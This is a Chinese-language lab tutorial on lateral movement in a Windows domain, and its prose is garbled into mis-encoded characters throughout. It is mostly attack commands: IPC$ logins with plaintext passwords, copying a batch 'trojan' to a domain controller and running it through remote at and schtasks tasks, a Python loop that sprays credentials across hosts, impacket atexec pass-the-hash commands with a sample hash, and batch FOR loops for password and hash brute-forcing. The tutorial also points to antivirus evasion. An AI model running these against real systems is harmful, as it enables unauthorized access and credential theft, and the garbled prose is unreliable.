â€œpasswordâ€ user:domain\\username #åŸŸå†… dir \\xx.xx.xx.xx\\c$\\ #æŸ¥çœ‹æ–‡ä»¶åˆ—è¡¨ copy \\xx.xx.xx.xx\\c$\\1.bat 1.bat #ä¸‹è½½æ–‡ä»¶ copy 1.bat \\xx.xx.xx.xx\\c$ #å¤åˆ¶æ–‡ä»¶ net use \\xx.xx.xx.xx\\c$\\1.bat del #åˆ é™¤IPC net view xx.xx.xx.xx #æŸ¥çœ‹å¯¹æ–¹å…±äº« 5. å»ºç«‹IPCå¸¸è§çš„é”™è¯¯ä»£ç  é”™è¯¯å·5ï¼š ## æ‹’ç»è®¿é—®ï¼Œæƒé™ä¸å¤Ÿï¼› é”™è¯¯å·51ï¼š ## æ— æ³•æ‰¾åˆ°ç½‘ç»œè·¯å¾„ï¼ˆç½‘ç»œæœ‰é—®é¢˜ï¼‰ã€‚ é”™è¯¯å·53ï¼š## æ‰¾ä¸åˆ°ç½‘ç»œè·¯å¾„ï¼ˆipåœ°å€é”™è¯¯ï¼›ç›®æ ‡ä¸»æœºæœªå¼€æœºï¼›ç›®æ ‡ä¸»æœºlanmanserveræœåŠ¡æœªå¯åŠ¨ï¼›ç›®æ ‡ä¸»æœºé˜²ç«å¢™è®¾ç½®è¿‡æ»¤ç«¯å£ï¼‰ã€‚ é”™è¯¯å·67ï¼š## æ‰¾ä¸åˆ°ç½‘ç»œåï¼ˆæœ¬åœ°ä¸»æœºä¸­lanmanworkstationæœåŠ¡æœªå¯åŠ¨æˆ–è€…ç›®æ ‡ä¸»æœºåˆ é™¤äº†ipc$ï¼‰ã€‚ é”™è¯¯å·1219ï¼š ## æä¾›çš„å‡­æ®ä¸å·²å­˜åœ¨çš„å‡­æ®é›†å†²çªï¼ˆå·²ç»å»ºç«‹äº†ä¸€ä¸ªipc$ï¼Œå¯ä»¥åˆ é™¤å†è¿ï¼‰ã€‚ é”™è¯¯å·1326ï¼š ## ç”¨æˆ·åæˆ–å¯†ç é”™è¯¯ã€‚ é”™è¯¯å·1792ï¼š## è¯•å›¾ç™»å½•ï¼Œç½‘ç»œç™»å½•æœåŠ¡æ²¡æœ‰å¯åŠ¨ï¼ˆç›®æ ‡ä¸»æœºä¸­NetLogonæœåŠ¡æœªå¯åŠ¨ï¼‰ã€‚ é”™è¯¯å·2242ï¼š ## è¯¥ç”¨æˆ·çš„å¯†ç å·²ç»è¿‡æœŸã€‚ 6. å»ºç«‹IPCå¤±è´¥çš„åŸå›  1. ç›®æ ‡ç³»ç»Ÿä¸æ˜¯NTæˆ–è€…ä»¥ä¸Šçš„æ“ä½œç³»ç»Ÿ 2. å¯¹æ–¹æ²¡æœ‰æ‰“å¼€IPC$å…±äº« 3. å¯¹æ–¹æœªå¼€å¯139ã€445ç«¯å£ï¼Œæˆ–è€…è¢«é˜²ç«å¢™å±è”½ 4. è¾“å‡ºå‘½ä»¤ã€è´¦å·å¯†ç æœ‰é”™è¯¯ 1-1 æ˜æ–‡å£ä»¤ä¼ é€’atå’Œschtaskså‘½ä»¤ï¼š æ³¨æ„atä¸»è¦ç”¨äºwindows server 2012ä»¥ä¸‹ç‰ˆæœ¬ï¼Œschtasksä¸»è¦æ˜¯ç”¨äºå¤§äºç­‰äºwindows server2012ç‰ˆæœ¬çš„ç¯å¢ƒ at schtasks # at windows2012 net use \\192.168.241.21\\ipc$ â€œAdmin12345â€ user:god.org\\administrator #å»ºç«‹ipcé“¾æ¥ copy add.bat \\192.168.241.21\\c$ #æ‹·è´æ‰§è¡Œæ–‡ä»¶åˆ°ç›®æ ‡æœºå™¨ at \\192.168.241.21 15:47 c:\\add.bat #æ·»åŠ è®¡åˆ’ä»»åŠ¡ net use \\192.168.241.159\\ipc$ â€œ123â€ user:administrator copy add.bat \\192.168.241.159\\c$ # schtasks windows2012 net use \\192.168.241.32\\ipc$ â€œadmin!@#45â€ user:god.org\\administrator #å»ºç«‹ipcé“¾æ¥ copy add.bat \\192.168.241.32 ru â€œSYSTEMâ€ tn adduser sc DAILY tr c:\\add.bat F #åˆ›å»ºadduserä»»åŠ¡å¯¹åº”æ‰§è¡Œæ–‡ä»¶ schtasks run s 192.168.241.32 tn adduser i #è¿è¡Œadduserä»»åŠ¡ schtasks delete s 192.168.241.21 tn adduser f #åˆ é™¤adduserä»»åŠ¡ ## å»ºç«‹ipcè¿æ¥(æ³¨æ„ï¼šåŸŸç”¨æˆ·åªèƒ½å’ŒåŸŸç”¨æˆ·å»ºç«‹ipcè¿æ¥) net use \\192.168.241.32\\ipc$ â€œadmin!@#45â€ user:god.org\\administrator ## å¤åˆ¶æ–‡ä»¶ï¼ˆæœ¨é©¬ï¼‰åˆ°å…¶Cç›˜ copy add.bat \\192.168.241.32\\c$ ## åˆ›å»ºadduserä»»åŠ¡å¯¹åº”æ‰§è¡Œæ–‡ä»¶ schtasks create s 192.168.241.32 ru â€œSYSTEMâ€ tn adduser sc DAILY tr c:\\add.bat F ## è¿è¡Œadduserä»»åŠ¡ schtasks run s 192.168.241.32 tn adduser i ## åˆ é™¤adduserä»»åŠ¡ schtasks delete s 192.168.241.21 tn adduser f 1-1 atè®¡åˆ’ä»»åŠ¡æˆ‘ä»¬é€šè¿‡mary-pcæ¥æµ‹è¯•ä¸€ä¸‹ï¼š å¦‚æœä½ ç”¨çš„æ˜¯æœ¬åœ°ç”¨æˆ·ç™»å½•çš„ï¼Œé‚£ä¹ˆnet timeä¼šæŠ¥é”™ï¼Œä¸ç®¡ä½ æ˜¯ä¸æ˜¯ç®¡ç†å‘˜ï¼Œæ‰€ä»¥å¿…é¡»åœ¨åŸŸç”¨æˆ·ä¸‹æ‰èƒ½ç”¨net time å…ˆçœ‹ä¸€ä¸‹åŸŸæ§ä¸»æœºçš„ç®¡ç†å‘˜å¯†ç ï¼Œå½“ç„¶äº†ï¼Œæˆ‘ä»¬è‚¯å®šä¸æ˜¯è½»æ˜“çš„å°±èƒ½è·å¾—åŸŸæ§ä¸»æœºçš„å¯†ç çš„ï¼Œå°±æ˜¯å…ˆçœ‹ä¸€ä¸‹ é€šè¿‡æˆ‘ä»¬æ‹¿ä¸‹çš„webserverä¸»æœºæ¥è·å¾—ä»¥ä¸‹åŸŸæ§ä¸»æœºçš„ipåœ°å€ å»ºç«‹ipcè¿æ¥ æ¯”å¦‚æˆ‘ä»¬åœ¨webserverä¸»æœºçš„cç›˜ä¸Šé¢ä¸Šä¼ äº†ä¸€ä¸ªadd.batæ–‡ä»¶ï¼Œç„¶åå°†è¿™ä¸ªadd.batæ–‡ä»¶é€šè¿‡ipcè¿æ¥ä¸Šä¼ åˆ°DCä¸»æœºä¸Šã€‚ æ³¨æ„å¯†ç çš„å¤æ‚åº¦é«˜ä¸€äº›ï¼Œä¸ç„¶ç”¨æˆ·åˆ›å»ºä¸ä¼šæˆåŠŸçš„ï¼Œå¹¶ä¸”ä¸æˆåŠŸä¹Ÿä¸ä¼šæœ‰ä»»ä½•çš„æç¤ºã€‚ é€šè¿‡ipcè¿æ¥å°†å®ƒæ‹·è´åˆ°DCä¸»æœºçš„cç›˜ä¸Š æŸ¥çœ‹ä¸€ä¸‹DCä¸»æœºï¼Œçœ‹çœ‹æ˜¯å¦ä¸Šä¼ æˆåŠŸäº† é€šè¿‡atæ¥åˆ›å»ºè®¡åˆ’ä»»åŠ¡ ç„¶åæŸ¥çœ‹DCä¸»æœºä¸Šçš„ç”¨æˆ·ï¼Œç­‰ä¸€ä¼šåï¼Œå°±æœ‰äº†æˆ‘ä»¬çš„ç”¨æˆ· 1-2 schtasksè®¡åˆ’ä»»åŠ¡å½“æˆ‘ä»¬åœ¨winserver 2012åŠä»¥ä¸Šç‰ˆæœ¬çš„ç³»ç»Ÿä¸­æ‰§è¡ŒatæŒ‡ä»¤çš„æ—¶å€™ä¼šæŠ¥é”™ï¼Œè¯·ä½¿ç”¨schtasksï¼Œæ¯”å¦‚æˆ‘ä»¬é€šè¿‡webserveræ¥è¿æ¥ä¸€ä¸‹è¿™ä¸ªserver2012 Sql Serverçš„ä¸»æœºï¼Œé€šè¿‡å®ƒçš„æœ¬åœ°ç”¨æˆ·å’Œå¯†ç æ¥è¿æ¥è¯•è¯•ï¼Œä¹Ÿå¯ä»¥ç”¨åŸŸç”¨æˆ·è¿æ¥è¯•è¯•æ˜‚ åœ¨è¿™ä¸ªä¸»æœºä¸Šæ‰§è¡ŒatæŒ‡ä»¤å°±æŠ¥é”™ æˆ‘ä»¬é€šè¿‡webserveræ¥è¿æ¥ä¸€ä¸‹è¿™ä¸ªserver2012çš„ä¸»æœºï¼Œé€šè¿‡å®ƒçš„æœ¬åœ°ç”¨æˆ·å’Œå¯†ç æ¥è¿æ¥è¯•è¯•ï¼Œä¹Ÿå¯ä»¥ç”¨åŸŸç”¨æˆ·è¿æ¥è¯•è¯•æ˜‚ ç„¶åcopyæˆ‘ä»¬çš„add.batæ–‡ä»¶åˆ°è¿™ä¸ªä¸»æœºçš„cç›˜ä¸Šï¼Œå°±ä¼šå‘ç°æŠ¥é”™äº† ä¸»è¦åŸå› æ˜¯æˆ‘ä»¬è¿æ¥server2012è¿™ä¸ªä¸»æœºçš„æ—¶å€™ï¼Œç”¨æˆ·çš„æ˜¯æ™®é€šåŸŸç”¨æˆ·ï¼Œæƒé™ä¸å¤Ÿï¼Œæ‰€ä»¥ä¸èƒ½copyæ–‡ä»¶åˆ°cç›˜ã€‚ é‚£ä¹ˆæ¥ä¸‹æ¥æˆ‘ä»¬é€šè¿‡server2012è¿™ä¸ªä¸»æœºçš„æœ¬åœ°ç®¡ç†å‘˜å»ºç«‹ipcè¿æ¥è¯•è¯•çœ‹ï¼ŒæŠ¥é”™äº†ï¼Œå› ä¸ºä¸¤ä¸ªç”µè„‘ä¹‹å®¶çš„ipcè¿æ¥åªèƒ½å»ºç«‹ä¸€ä¸ªï¼Œæˆ‘ä»¬éœ€è¦å…ˆåˆ é™¤ä¹‹å‰çš„è¿æ¥ã€‚ä¸‹é¢çš„å›¾ä¸­ç”¨æˆ·å†™é”™äº†ï¼Œç”¨ user:administraotr åˆ é™¤ä¹‹å‰ä½¿ç”¨åŸŸç”¨æˆ·å»ºç«‹çš„ipcè¿æ¥ï¼š ç„¶åå†é€šè¿‡server2012çš„æœ¬åœ°ç®¡ç†å‘˜è´¦å·è¿æ¥ä¸€ä¸‹ï¼Œæ³¨æ„ï¼Œç”±äºæˆ‘ä»¬æ˜¯é€šè¿‡server2012 çš„æœ¬åœ°ç”¨æˆ·å»å»ºç«‹ipcè¿æ¥ï¼Œé‚£ä¹ˆæˆ‘ä»¬åœ¨webserverä¸»æœºä¸Šä½¿ç”¨çš„ç”¨æˆ·ä¹Ÿä¸èƒ½æ˜¯åŸŸç”¨æˆ·ï¼Œå¿…é¡»æ˜¯æœ¬åœ°ç”¨æˆ·ï¼Œä¸ç„¶ä¼šæç¤ºç™»å½•å¤±è´¥ã€‚ å¤åˆ¶add.batåˆ°server2012çš„cç›˜é‡Œé¢ çœ‹server2012ä¸»æœº æ¥ä¸‹æ¥é€šè¿‡schtasksåˆ›å»ºè®¡åˆ’ä»»åŠ¡ï¼Œæ¥æ‰§è¡Œadd.bat åˆ›å»ºçš„æ˜¯ä¸€ä¸ªæ¯å¤©æ‰§è¡Œçš„ä»»åŠ¡ï¼Œæˆ‘ä»¬å¯ä»¥æ‰‹åŠ¨è§¦å‘ä¸€ä¸‹ä»–ï¼Œè®©ä»–ç°åœ¨å°±æ‰§è¡Œï¼Œå¦‚ä¸‹ æŸ¥çœ‹server2012ä¸»æœºä¸Šçš„ç”¨æˆ· 1-3 Pythonè„šæœ¬æ‰¹é‡ä¼ é€’(pass)ä¸Šé¢æˆ‘ä»¬ä½¿ç”¨çš„æ‰¹é‡å†Œæ•°è¯­æ³•ä¸­ï¼Œå¤§å®¶å¯ä»¥çœ‹åˆ°ï¼Œå…¶å®å¯ä»¥è®¾ç½®ä¸‰ä¸ªå˜é‡ï¼Œipã€ç”¨æˆ·åã€å¯†ç ï¼Œä½†æ˜¯æˆ‘ä»¬å†™çš„forå¾ªç¯æ‰¹é‡è¯­å¥ï¼Œæ¯æ¬¡åªèƒ½è®¾ç½®ä¸€ä¸ªå˜é‡ï¼Œå¦‚æœæƒ³å¤šä¸ªå˜é‡éƒ½è‡ªåŠ¨å˜åŒ–çš„è¯ï¼Œä¹Ÿå°±æ˜¯å¤šç»„åˆæ£€æµ‹ï¼Œè¿™å°±éœ€è¦è‡ªå·±å†™è„šæœ¬äº†æˆ–è€…æ‰¹å¤„ç†è¯­å¥ã€‚é‚£ä¹ˆå¯ä»¥é€šè¿‡pythonè¯­è¨€æ¥å†™ï¼Œæ¯”è¾ƒç®€å•ï¼Œè€Œä¸”é€šè¿‡pythonçš„ç¬¬ä¸‰æ–¹åº“å¯ä»¥å¯¹pyç¨‹åºæ‰“åŒ…æˆexeç¨‹åºæ¥æ‰§è¡Œï¼Œå¹¶ä¸”åšå…æ€ä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œæœ‰å¥½å¤špythonç¨‹åºçš„å…æ€ä¸“é¢˜ å‰æœŸé™¤äº†æ”¶é›†æ˜æ–‡å¯†ç HASHç­‰ï¼Œè¿˜æ”¶é›†äº†ç”¨æˆ·åï¼Œç”¨æˆ·åé…åˆå¯†ç å­—å…¸èƒ½æ‰¹é‡ä¼ é€’ net use \\192.168.241.32\\ipc$ admin!@#45 user:god\\dbadmin # pip install pyinstaller #pyinstaller -F jaden.py ç”Ÿæˆå¯æ‰§è¡Œexe import os,time ips{ â€˜192.168.241.21â€™, â€˜192.168.241.25â€™, â€˜192.168.241.29â€™, â€˜192.168.241.30â€™, â€˜192.168.241.31â€™, â€˜192.168.241.33â€™ } users{ â€˜administratorâ€™, â€˜bossâ€™, â€˜dbadminâ€™, â€˜fileadminâ€™, â€˜mackâ€™, â€˜maryâ€™, â€˜vpnadmâ€™, â€˜webadminâ€™ } passs{ â€˜adminâ€™, â€˜admin!@#45â€™, â€˜Admin12345â€™ } for ip in ips: for user in users: for mima in passs: execâ€net use \\â€œ+â€\\â€œ+ip+â€\\ipc$ â€œ+mima+â€ user:god\\â€œ+user print(â€˜â€™,exec,â€™â€™) os.system(exec) time.sleep(1) ä¸Šé¢å°±æ˜¯é€šè¿‡å˜é‡æ›¿æ¢æ¥å°è¯•å’Œå„ä¸ªä¸»æœºæ¥è¿›è¡Œipcè¿æ¥ï¼Œçœ‹çœ‹å“ªä¸ªèƒ½è¿æ¥æˆåŠŸã€‚ è¿æ¥å»ºç«‹å¥½äº†ä¹‹åï¼Œå°±å¯ä»¥åˆ©ç”¨ä¹‹å‰è®²çš„åˆ›å»ºè®¡åˆ’ä»»åŠ¡ï¼Œæ‰§è¡Œè®¡åˆ’ä»»åŠ¡çš„æ–¹å¼æ¥æ‰§è¡Œç³»ç»ŸæŒ‡ä»¤æˆ–è€…åˆ›å»ºç”¨æˆ·ç­‰æ“ä½œäº†ã€‚ å…¶å®ç”¨ä»€ä¹ˆå¼€å‘è¯­è¨€åŸºæœ¬éƒ½å¯ä»¥å†™å‡ºæ¥ï¼Œä½†æ˜¯è¦è€ƒè™‘è¯­è¨€çš„å…æ€æ•ˆæœã€ç¨‹åºä½“ç§¯å¤§å°ã€æ‰§è¡Œæ•ˆç‡ç­‰æ–¹é¢è¿›è¡Œè€ƒè™‘ã€‚å†™åˆ°pythonæ–‡ä»¶ä¸­ æ‰“åŒ…æˆexeï¼Œä¼šè‡ªåŠ¨åœ¨å½“å‰ç›®å½•ä¸­å‡ºç°ä¸€ä¸ªdistæ–‡ä»¶å¤¹ï¼Œé‡Œé¢æ”¾ç€æ‰“åŒ…å¥½çš„exeç¨‹åº å°†exeæ”¾åˆ°webserverä¸Šæ‰§è¡Œä¸€ä¸‹çœ‹æ•ˆæœ æ‰§è¡Œè¿‡ç¨‹ä¸­å¦‚æœå‡ºç°å¦‚ä¸‹é”™è¯¯ï¼Œå¯èƒ½æ˜¯ä½ çš„pythonç‰ˆæœ¬å¤ªé«˜ï¼Œå’Œç°åœ¨çš„ç³»ç»Ÿå…¼å®¹æ€§ä¸å¥½ï¼Œå°†pythonæ”¹ä¸ºpython3.7ä»¥ä¸‹çš„ç‰ˆæœ¬ è¿™ä¸¤ä¸ªå®éªŒå·²ç»æˆåŠŸäº†ï¼Œä½†æ˜¯è¿™ä¸¤ä¸ªå®éªŒéƒ½æ˜¯é€šè¿‡æ˜æ–‡å¯†ç ä¼ é€’è¿›è¡Œçš„ï¼Œä½†æ˜¯å¦‚æœæˆ‘ä»¬è·å–åˆ°çš„æ˜¯hashå€¼å‘¢ï¼Ÿmimkatzå¾ˆå¯èƒ½è·å–ä¸åˆ°æ˜æ–‡å¯†ç ï¼Œè·å–åˆ°çš„æ˜¯hashå€¼ï¼Œatå’Œschtasksè¿™ä¸¤ä¸ªæŒ‡ä»¤æ˜¯ä¸èƒ½ä½¿ç”¨hashå€¼çš„ã€‚æ‰€ä»¥æˆ‘ä»¬è¦è€ƒè™‘é€šè¿‡hashå€¼å¦‚ä½•ç™»å½•ï¼Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥å€ŸåŠ©ä¸€ä¸ªç½‘ç»œåè®®å·¥å…·åŒ…impacket 1-4 å·¥å…·åœ°å€## æ¶‰åŠèµ„æºï¼š Hashcatï¼šhttps://github.com/hashcat/hashcat ## å¯†ç ç ´è§£å…¨èƒ½å·¥å…·ï¼šHashcatå¯†ç ç ´è§£æ”»ç•¥ï¼š https://www.freebuf.com/sectool/164507.html mimikatzï¼šhttps://github.com/gentilkiwi/mimikatz impacketï¼šhttps://github.com/SecureAuthCorp/impacket impacket-examples-windowsï¼šhttps://gitee.com/RichChigga/impacket-examples-windows PsToolsï¼šhttps://docs.microsoft.com/zh-cn/sysinternals/downloads/pstools ProcDumpï¼šhttps://docs.microsoft.com/zh-cn/sysinternals/downloads/procdumpwmiexec.vbsï¼š https://github.com/realdeveloperongithub/K8tools/blob/master/wmiexec.vbs wmiexec.vbsï¼ˆæ‰¾äº†ä¿©ï¼‰ï¼šhttps://gitee.com/mirrors/K8tools/blob/master/wmiexec.vbs 1-2 hashå£ä»¤ä¼ é€’mpacketç½‘ç»œåè®®å·¥å…·åŒ…ä»‹ç»ï¼šhttps://www.freebuf.com/sectool/175208.html æˆ‘ä»¬å¯ä»¥å»ç½‘ä¸Šä¸‹è½½ä¸€ä¸‹è¿™ä¸ªå·¥å…·åŒ…ï¼Œæœ‰å¥½å¤šæ˜¯pyæ–‡ä»¶çš„ï¼Œæˆ‘ä»¬ç°åœ¨ä¸»è¦ä½¿ç”¨çš„exeç¨‹åºçš„ï¼Œå› ä¸ºç®€å•ï¼Œä¸éœ€è¦å®‰è£…pythonç¯å¢ƒ 2-1 atexec-impacketè¿™ä¸ªå·¥å…·æ˜¯åŸºäºatæ”¹çš„ï¼Œæ—¢æ”¯æŒæ˜æ–‡ä¼ é€’ã€ä¹Ÿæ”¯æŒhashä¼ é€’ ## æ¨ªå‘æ¸—é€æ˜æ–‡hashä¼ é€’atexec-impacket æºç ï¼šhttps://github.com/SecureAuthCorp/impacket æ‰“åŒ…çš„exeç¨‹åºï¼šhttps://gitee.com/RichChigga/impacket-examples-windows atexec.exe .administrator:Admin12345@192.168.241.21 â€œwhoamiâ€ #åŸºäºç›®æ ‡ä¸»æœºçš„æœ¬åœ°ç”¨æˆ·æ˜æ–‡å¯†ç æ¥æ‰§è¡ŒæŒ‡ä»¤ atexec.exe godadministrator:Admin12345@192.168.241.21 â€œwhoamiâ€ #åŸºäºç›®æ ‡ä¸»æœºçš„åŸŸç”¨æˆ·æ˜æ–‡å¯†ç æ¥æ‰§è¡ŒæŒ‡ä»¤ atexec.exe -hashes :ccef208c6485269c20db2cad21734fe7 .administrator@192.168.241.21 â€œwhoamiâ€ #åŸºäºç›®æ ‡ä¸»æœºçš„æœ¬åœ°ç”¨æˆ·hashå¯†ç æ¥æ‰§è¡ŒæŒ‡ä»¤ ## atå’Œschtaskséƒ½ä¸æ”¯æŒhashå€¼çš„å¯†ç ï¼Œè¦è§£å†³éœ€è¦ç”¨impacketå·¥å…·åŒ… atexec.exe .[ç”¨æˆ·å]:[å¯†ç ]@[IP] â€œ[å‘½ä»¤]â€ atexec.exe [åŸŸå][ç”¨æˆ·å]:[å¯†ç ]@[IP] â€œ[å‘½ä»¤]â€ atexec.exe -hashes [å¯†ç çš„hashå€¼] .[ç”¨æˆ·å]@[IP] â€œ[å‘½ä»¤]â€ atexec.exe .administrator:Admin12345@192.168.241.21 â€œwhoamiâ€ atexec.exe godadministrator:Admin12345@192.168.241.21 â€œwhoamiâ€ atexec.exe -hashes :ccef208c6485269c20db2cad21734fe7 .administrator@192.168.241.21 â€œwhoamiâ€ æ˜æ–‡å£ä»¤ä¼ é€’ç¤ºä¾‹ï¼š ## æˆ‘ä»¬çœ‹åˆ°æ‰§è¡Œæ²¡æœ‰é—®é¢˜ï¼Œhashå¯†ç çš„å¤§å®¶ä¹Ÿå¯ä»¥å»å°è¯•ä¸€ä¸‹ï¼Œè¿™é‡Œæˆ‘å°±ä¸æ¼”ç¤ºäº†ï¼Œè¿™ä¸ªå·¥å…·çš„ä¼˜ç‚¹å°±æ˜¯æ”¯æŒæ˜æ–‡å¯†ç å’Œhashå¯†ç ä¼ é€’ï¼Œç¼ºç‚¹å°±æ˜¯åˆ«äººå¼€å‘å¥½çš„ç¬¬ä¸‰æ–¹å·¥å…·ï¼Œä¸åƒå‰é¢çš„atå’ŒschtasksæŒ‡ä»¤ï¼Œæ˜¯ç³»ç»Ÿè‡ªå¸¦çš„æŒ‡ä»¤ï¼Œæ—¢ç„¶æ˜¯å·¥å…·å°±å¯èƒ½ä¼šæ”¶åˆ°æ€è½¯ã€é˜²ç«å¢™ç­‰çš„å¹²æ‰°ï¼Œè¿˜éœ€è¦è€ƒè™‘å¯¹å·¥å…·è¿›è¡Œå…æ€å¤„ç†ã€‚ 2-2 ä¼ é€’æ€è·¯## å…¶å®æ­£å¸¸æ¥è®²ï¼Œæˆ‘ä»¬æ˜¯ä¸çŸ¥é“åŸŸæ§ä¸»æœºçš„å¯†ç çš„ï¼ŒæŒ‰ç…§æ­£å¸¸çš„æµç¨‹æ¥è¯´ï¼Œæˆ‘ä»¬æ‹¿ä¸‹äº†æŸä¸ªwebä¸»æœºï¼Œé€šè¿‡mimikatzç­‰å·¥å…·æ”¶é›†åˆ°äº†webä¸»æœºæœ¬æœºçš„ç”¨æˆ·åå’Œå¯†ç ä¿¡æ¯ï¼Œç„¶ååŸºäºè¿™äº›è·å¾—çš„ä¿¡æ¯æ¥è¿›è¡Œä¼ é€’ã€‚ 1. é€šè¿‡mimikatzæ”¶é›†æ˜æ–‡æˆ–hashå€¼çš„å¯†ç ï¼Œâ€œnet user domainâ€æ”¶é›†åŸŸå†…çš„ç”¨æˆ·åï¼Œâ€œfor L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.241.%I | findstr â€œTTLâ€â€æ¢ç´¢åŸŸå†…å­˜æ´»åœ°å€ 2. æ‰¹é‡æ‰«æï¼Œç”¨å¯†ç æ’åº“ 3. æ”¶é›†æ›´å¤šå¯†ç  4. é‡å¤æ­¥éª¤2å’Œæ­¥éª¤3 è·å–ä¸»æœºå£ä»¤ä¿¡æ¯ ## æˆ‘ä»¬æ¼”ç¤ºä¸€ä¸‹ï¼Œå…ˆè·å–åˆ°webä¸»æœºçš„ç”¨æˆ·åå’Œå¯†ç ï¼Œè·å–åˆ°ä¹‹åï¼Œå¯ä»¥æ‹¿ç€è¿™äº›ç”¨æˆ·åå’Œå¯†ç å»å°è¯•è¿æ¥å…¶ä»–çš„ä¸»æœºï¼Œå› ä¸ºå¾ˆå¤šç®¡ç†å‘˜å†è¿›è¡Œç®¡ç†çš„æ—¶å€™ï¼Œä¸ºäº†æ–¹ä¾¿å·¥ä½œæˆ–è€…æ“ä½œä¸å½“ï¼Œä¼šè®¾ç½®ç›¸åŒç”¨æˆ·åå’Œå¯†ç ï¼Œé‚£ä¹ˆå…¶ä»–ä¸»æœºä¹Ÿå¾ˆæœ‰å¯èƒ½æ˜¯åŒæ ·çš„ç”¨æˆ·åå’Œå¯†ç ã€‚ æˆ‘ä»¬å…ˆå°†è¿™äº›ç”¨æˆ·åå’Œå¯†ç ä¿å­˜åˆ°æŸä¸ªæ–‡ä»¶ä¸­ã€‚å°±æ”¾åˆ°atexec.exeæ‰€åœ¨ç›®å½•å§ æ£€æµ‹å­˜æ´»ä¸»æœº(æ‰¹é‡ping) æ£€æµ‹å­˜æ´»çš„ä¸»æœºï¼Œæˆ‘ä»¬çš„æ‰‹æ³•å¾ˆå¤šï¼Œæ¯”å¦‚å‰é¢ä¿¡æ¯æ”¶é›†ä¸­æåˆ°çš„é‚£å‡ ä¸ªå·¥å…·ï¼Œå¤§å®¶å¿˜è®°äº†çš„è¯å¯ä»¥å›å»å¤ä¹ ä¸€ä¸‹ã€‚ ä¸‹é¢è¯´ä¸€ä¸ªæ–°çš„æ‰‹æ³•ï¼Œé€šè¿‡pingæ¥æ‰¹é‡æ£€æµ‹ for L %I in (1,1,245) Do @ping -w 1 -n 1 192.168.241.%I | findstr â€œTTLâ€ æ•ˆæœï¼šæˆ‘ç›®å‰åªå¼€äº†ä¸‹é¢å››ä¸ªä¸»æœºï¼Œè¿™é‡Œéœ€è¦æ³¨æ„ä¸€ç‚¹ï¼Œé‚£å°±æ˜¯pingè¿™ä¸ªè¯·æ±‚ï¼Œå¯¹æ–¹å¯èƒ½è®¾ç½®äº†ä¸å…è®¸pingè®¿é—®ï¼Œé‚£å°±pingä¸åˆ°çš„ï¼Œæ¢å…¶ä»–çš„æ‰‹æ³•ã€‚ å…ˆæŠŠè¿™äº›ipåœ°å€ä¿å­˜åˆ°æŸä¸ªæ–‡ä»¶ä¸­ï¼Œå¦‚ä¸‹ å‘ç°äº†å¾ˆå¤šä¸»æœºï¼Œç„¶åé€šè¿‡æˆ‘ä»¬è·å–åˆ°çš„webä¸»æœºä¸Šçš„å¯†ç ï¼Œæ¥ä½œä¸ºå­—å…¸ï¼Œå»æ‰¹é‡è¿æ¥è¿™äº›ipä¸»æœºï¼Œè¿™å°±æ˜¯ä¸€ä¸ªæ€è·¯ï¼Œåˆ©ç”¨çš„å°±æ˜¯å¤§å®¶å¯†ç å¯èƒ½æ˜¯ä¸€æ ·çš„ã€‚ å¦‚æœå‘ç°ä¸€æ ·çš„ï¼Œé‚£ä¹ˆå°±ç»§ç»­åœ¨è¿™ä¸ªä¸»æœºä¸Šå†è¿›è¡Œä¿¡æ¯æ”¶é›†ï¼Œä¹Ÿè®¸ä¼šæ”¶è·æ›´å¤šä¿¡æ¯ï¼Œå†åˆ©ç”¨è¿™äº›ä¿¡æ¯è¿›è¡Œæ‰¹é‡è¿æ¥æµ‹è¯•ï¼Œè¿™å°±æ˜¯æ€è·¯ã€‚ 2-3 shellè„šæœ¬ç¨‹åºæ‰¹é‡ä¼ é€’## åˆ©ç”¨æ‰¹å¤„ç†è„šæœ¬æ–‡ä»¶æ‰¹é‡å°è¯•æ¨ªå‘æ¸—é€ ## â€œ%%iâ€æ˜¯è‡ªå˜é‡ï¼Œå€¼æ¥è‡ªåé¢æ‹¬å·ä¸­çš„.txtæ–‡ä»¶ï¼Œæ¯è¡Œä¸€ä¸ªå€¼ ## æ‰¹é‡æ£€æµ‹IPå¯¹åº”æ˜æ–‡è¿æ¥ FOR F %i in ([æ¯è¡Œä¸€ä¸ªIP.txt]) do net use \\%i\\ipc$â€[å¯†ç ]â€ user:[ç”¨æˆ·å] FOR F %i in (ips.txt) do net use \\%i\\ipc$ â€œadmin!@#45â€ user:administrator ## æ‰¹é‡æ£€æµ‹IPå¯¹åº”æ˜æ–‡å›æ˜¾ç‰ˆ FOR F %i in ([æ¯è¡Œä¸€ä¸ªIP.txt]) do atexec.exe .[ç”¨æˆ·å]:[å¯†ç ]@%i â€œ[å‘½ä»¤]â€ FOR F %i in (ips.txt) do atexec.exe .administrator:admin!@#45@%i whoami ## æ‰¹é‡æ£€æµ‹æ˜æ–‡å¯¹åº”IPå›æ˜¾ç‰ˆ FOR F %i in ([æ¯è¡Œä¸€ä¸ªå¯†ç .txt]) do atexec.exe .[ç”¨æˆ·å]:%i@[IP] â€œ[å‘½ä»¤]â€ FOR F %i in (pass.txt) do atexec.exe .administrator:%i@192.168.241.21 whoami ## æ‰¹é‡æ£€æµ‹HASHå¯¹åº”IPå›æ˜¾ç‰ˆ FOR F %i in ([æ¯è¡Œä¸€ä¸ªå¯†ç çš„hashå€¼.txt]) do atexec.exe -hashes %i .[ç”¨æˆ·å]@[IP] â€œ[å‘½ä»¤]â€ ## é’ˆå¯¹å•ä¸ªIPè¿›è¡Œhashå¯†ç ä¼ é€’çˆ†ç ´ FOR F %i in (hash.txt) do atexec.exe -hashes %i .administrator@192.168.241.21 whoami ä¸Šé¢çš„æŒ‡ä»¤ä¸­ï¼Œå…¶ä¸­ips.txtå°±æ˜¯æˆ‘ä»¬é€šè¿‡pingæ¢é’ˆæ¢æµ‹åˆ°çš„å­˜æ´»ä¸»æœºçš„ipåœ°å€æ–‡ä»¶ï¼Œæ¯”å¦‚æˆ‘ä»¬å°†æ˜æ–‡æ£€æµ‹çš„é‚£ä¸ªæŒ‡ä»¤æ”¾åˆ°ä¸€ä¸ªæ‰¹å¤„ç†æ–‡ä»¶ä¸­ï¼Œå¦‚ä¸‹ æ‰§è¡Œä¸Šé¢çš„æ‰¹å¤„ç†æ–‡ä»¶ é€šè¿‡æ‰§è¡ŒæŒ‡ä»¤çš„è¿”å›ç»“æœå°±çŸ¥é“å“ªä¸ªä¸»æœºçš„å¯†ç 